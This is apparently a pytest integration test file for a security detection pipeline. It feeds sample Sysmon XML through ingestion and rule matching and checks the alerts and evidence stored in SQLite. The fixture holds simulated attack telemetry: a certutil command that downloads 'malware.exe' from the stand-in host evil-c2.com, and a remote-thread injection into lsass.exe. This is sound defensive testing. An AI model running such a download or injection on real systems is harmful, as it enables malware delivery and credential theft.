"""Integration tests for IngestionPipeline and DetectionEngine integration.

Validates end-to-end telemetry ingestion, rule matching, alert creation,
evidence linking in SQLite, foreign key constraints, and run_detections toggle.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from app.database.connection import DatabaseManager, DatabaseSettings
from app.database.migrations import MigrationRunner
from app.database.repository import AlertRepository, EventRepository
from app.detection.engine import DetectionEngine
from app.detection.loader import RuleLoader
from app.ingestion.pipeline import IngestionPipeline, IngestionResult

RULES_DIR = Path(__file__).resolve().parent.parent.parent / "rules" / "sysmon"

MIGRATIONS_DIR = Path(__file__).resolve().parent.parent.parent / "app" / "database" / "migrations"


SAMPLE_SYSMON_ATTACK_XML = """<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-11-04T12:00:00.123456Z"/>
      <EventRecordID>9901</EventRecordID>
      <Correlation/>
      <Execution ProcessID="1000" ThreadID="1004"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>SOC-ENDPOINT-01.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-11-04 12:00:00.123</Data>
      <Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
      <Data Name="ProcessId">4412</Data>
      <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -urlcache -split -f http://evil-c2.com/malware.exe C:\\Temp\\malware.exe</Data>
      <Data Name="CurrentDirectory">C:\\Windows\\Temp</Data>
      <Data Name="User">CORP\\Administrator</Data>
      <Data Name="LogonGuid">{11111111-2222-3333-4444-000000000001}</Data>
      <Data Name="LogonId">0x3e7</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA256=A1B2C3D4E5F67890123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0</Data>
      <Data Name="ParentProcessGuid">{11111111-2222-3333-4444-000000000002}</Data>
      <Data Name="ParentProcessId">2100</Data>
      <Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
      <Data Name="ParentCommandLine">cmd.exe /c download.bat</Data>
      <Data Name="ParentUser">CORP\\Administrator</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
      <EventID>8</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>8</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-11-04T12:01:00.654321Z"/>
      <EventRecordID>9902</EventRecordID>
      <Correlation/>
      <Execution ProcessID="1000" ThreadID="1008"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>SOC-ENDPOINT-01.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-11-04 12:01:00.654</Data>
      <Data Name="SourceProcessGuid">{11111111-2222-3333-4444-555555555556}</Data>
      <Data Name="SourceProcessId">6100</Data>
      <Data Name="SourceImage">C:\\Users\\Public\\injector.exe</Data>
      <Data Name="TargetProcessGuid">{11111111-2222-3333-4444-000000000670}</Data>
      <Data Name="TargetProcessId">672</Data>
      <Data Name="TargetImage">C:\\Windows\\System32\\lsass.exe</Data>
      <Data Name="NewThreadId">8890</Data>
      <Data Name="StartAddress">0x00007FF712340000</Data>
      <Data Name="StartModule">injector.exe</Data>
      <Data Name="StartFunction">ReflectiveLoader</Data>
    </EventData>
  </Event>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-11-04T12:02:00.000000Z"/>
      <EventRecordID>9903</EventRecordID>
      <Correlation/>
      <Execution ProcessID="1000" ThreadID="1010"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>SOC-ENDPOINT-01.corp.local</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">-</Data>
      <Data Name="UtcTime">2026-11-04 12:02:00.000</Data>
      <Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555557}</Data>
      <Data Name="ProcessId">5120</Data>
      <Data Name="Image">C:\\Windows\\System32\\certutil.exe</Data>
      <Data Name="CommandLine">certutil.exe -verify C:\\Certs\\ca.cer</Data>
      <Data Name="User">CORP\\Administrator</Data>
    </EventData>
  </Event>
</Events>"""


@pytest.fixture
def migrated_db(tmp_path: Path) -> DatabaseManager:
    """Fixture providing a fresh SQLite database migrated to latest schema."""
    db_file = tmp_path / "detection_integration.db"
    db_manager = DatabaseManager(db_path=db_file)
    runner = MigrationRunner(db_manager=db_manager, migrations_dir=MIGRATIONS_DIR)
    runner.apply_migrations()
    return db_manager


@pytest.fixture
def detection_engine() -> DetectionEngine:
    """Fixture providing DetectionEngine pre-loaded with all core Sysmon rules."""
    loader = RuleLoader()
    rules = loader.load_rules_from_directory(RULES_DIR, recursive=True, strict=True)
    engine = DetectionEngine()
    engine.load_rules(rules)
    return engine


def test_pipeline_detection_integration_end_to_end(
    migrated_db: DatabaseManager,
    detection_engine: DetectionEngine,
    tmp_path: Path,
) -> None:
    """Verify full pipeline: telemetry file ingest -> rule evaluation -> SQLite alerts & evidence."""
    # Write sample attack telemetry file
    telemetry_file = tmp_path / "sysmon_attack.xml"
    telemetry_file.write_text(SAMPLE_SYSMON_ATTACK_XML, encoding="utf-8")

    alert_repo = AlertRepository(migrated_db)
    pipeline = IngestionPipeline(
        db_manager=migrated_db,
        detection_engine=detection_engine,
        alert_repo=alert_repo,
    )

    result = pipeline.ingest_and_persist(
        file_path=telemetry_file,
        run_detections=True,
    )

    assert isinstance(result, IngestionResult)
    assert len(result.events) == 3
    assert result.inserted_count == 3

    # Detections: event 1 (certutil download -> WS-SYS-001) and event 2 (remote thread lsass -> WS-SYS-008)
    # Event 3 is benign certutil -verify and should NOT trigger WS-SYS-001
    assert len(result.matches) == 2
    assert result.alerts_created == 2
    assert len(result.alerts) == 2

    matched_rule_ids = {m.rule_id for m in result.matches}
    assert matched_rule_ids == {"WS-SYS-001", "WS-SYS-008"}

    # Verify alerts table in SQLite
    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT id, rule_id, severity, computer, user, description FROM alerts ORDER BY id ASC;")
        db_alerts = cur.fetchall()
        assert len(db_alerts) == 2

        alert1 = db_alerts[0]
        assert alert1["rule_id"] == "WS-SYS-001"
        assert alert1["severity"] == "high"
        assert "SOC-ENDPOINT-01" in alert1["computer"]

        alert2 = db_alerts[1]
        assert alert2["rule_id"] == "WS-SYS-008"
        assert alert2["severity"] == "critical"

        # Verify alert_evidence table in SQLite
        cur.execute("SELECT id, alert_id, event_id, matched_field, matched_value, explanation FROM alert_evidence ORDER BY id ASC;")
        evidence_rows = cur.fetchall()
        assert len(evidence_rows) == 2

        # Verify event_id is positive and points to a real row in events table
        for ev in evidence_rows:
            assert ev["event_id"] > 0
            cur.execute("SELECT id, event_id, computer, image FROM events WHERE id = ?;", (ev["event_id"],))
            event_row = cur.fetchone()
            assert event_row is not None
            assert ev["alert_id"] in (alert1["id"], alert2["id"])

            matched_fields = json.loads(ev["matched_field"])
            assert isinstance(matched_fields, list)
            assert len(matched_fields) > 0


def test_pipeline_run_detections_disabled(
    migrated_db: DatabaseManager,
    detection_engine: DetectionEngine,
    tmp_path: Path,
) -> None:
    """Verify run_detections=False skips detection evaluation and generates 0 alerts."""
    telemetry_file = tmp_path / "sysmon_attack_nodetect.xml"
    telemetry_file.write_text(SAMPLE_SYSMON_ATTACK_XML, encoding="utf-8")

    pipeline = IngestionPipeline(
        db_manager=migrated_db,
        detection_engine=detection_engine,
    )

    result = pipeline.ingest_and_persist(
        file_path=telemetry_file,
        run_detections=False,
    )

    assert isinstance(result, IngestionResult)
    assert len(result.events) == 3
    assert len(result.matches) == 0
    assert result.alerts_created == 0
    assert len(result.alerts) == 0

    with migrated_db.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) AS cnt FROM alerts;")
        assert cur.fetchone()["cnt"] == 0
        cur.execute("SELECT COUNT(*) AS cnt FROM alert_evidence;")
        assert cur.fetchone()["cnt"] == 0


def test_pipeline_auto_loads_detection_engine_from_rules_dir(
    migrated_db: DatabaseManager,
) -> None:
    """Verify IngestionPipeline automatically initializes DetectionEngine from rules/ directory."""
    pipeline = IngestionPipeline(db_manager=migrated_db)
    assert pipeline.detection_engine is not None
    assert len(pipeline.detection_engine.rules) == 16
